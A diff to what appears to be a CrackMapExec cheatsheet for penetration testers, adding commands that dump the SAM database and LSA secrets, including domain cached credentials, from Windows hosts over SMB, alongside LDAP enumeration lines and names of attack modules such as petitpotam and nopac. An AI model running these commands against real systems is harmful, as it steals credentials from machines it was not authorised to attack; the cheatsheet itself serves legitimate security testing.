@@ -58,6 +58,13 @@ cme ldap <target> -u <username> -p <password> --admin-count
 # ldap Modules to check machine account quota, get user description, extract network information
 cme ldap <target> -u <username> -p <password> -M <ldapmodules>
 
+% crackmapexec,cme,smb,sam,lsa,recon
+
+# CME: Dump SAM file (local users only)
+cme smb <target> -u <user> -p <password> --sam
+
+# CME: Dump LSA secrets (includes Domain Cached Credentials)
+cme smb <target> -u <user> -p <password> --lsa
 
 $ protocol: list=( smb ldap winrm mssql rdp) printf '%s\n' "${list[]@]}" printf '%s\n' "${list[]@]}"
 $ vuln: list=( "zerologo" "petitpotam" "nopac" "spider_plus" ) printf '%s\n' "${list[]@]}"
